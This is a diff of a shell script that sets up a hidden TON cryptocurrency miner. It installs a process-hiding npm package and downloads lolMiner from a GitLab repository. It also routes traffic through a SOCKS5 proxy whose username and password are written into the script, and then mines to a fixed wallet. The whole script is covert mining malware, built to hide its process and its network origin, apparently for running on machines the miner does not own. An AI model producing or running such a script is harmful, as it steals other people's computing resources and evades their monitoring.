@@ -1,15 +1,38 @@
-#!/bin/sh
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
-ph add lolMiner
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 18.216.28.28:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
 chmod +x lolMiner
-cpulimit -e lolMiner -l 30 &
-./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname)
+
+ph add lolMiner
+
+./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.XmasAzAz8 -p IhatePopUps
